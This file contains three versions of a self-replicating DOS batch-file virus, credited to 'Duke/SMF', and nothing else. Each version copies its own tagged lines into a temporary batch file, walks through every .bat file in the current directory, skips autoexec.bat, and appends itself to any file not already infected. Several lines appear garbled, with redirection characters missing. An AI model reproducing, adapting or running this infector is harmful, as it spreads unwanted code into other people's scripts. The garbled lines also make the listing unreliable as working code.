@echo off
if "%1=="$MF goto $MFz
echo. >$MF.bat
echo @echo off>>$MF.bat
find "$MF">$MF.bat
echo echo on>>$MF.bat
for %%b in (*.bat) do call $MF.bat $MF %%b
del $MF.bat>nul
goto $MFe
:$MFz
if "%2=="autoexec.bat goto $MFe
find "$MF"nul
if not errorlevel 1 goto $MFe
type $MF.bat>>%2
rem BAT.$MF 3.1 by Duke/$MF
:$MFe
echo on

@echo off
if "%1=="@ goto $&z
echo.>$&.bat
echo @echo off>>$&.bat
find "$&">$&.bat
for %%b in (*.bat) do call $&.bat @ %%b
del $&.bat
goto $&
:$&z [$MF 3.2, Duke/SMF]
if "%2=="autoexec.bat goto $&
find "$&"nul
if not errorlevel 1 goto $&
type $&.bat>>%2

@echo off %$&%
if "%1=="@ goto $&z
echo.>$&.bat
find "$&">$&.bat
for %%b in (*.bat) do call $&.bat @ %%b
del $&.bat
goto $&
:$&z [$MF 3.3,Duke/SMF]
if "%2=="autoexec.bat goto $&
find "$&"nul
if errorlevel 1 type $&.bat>>%2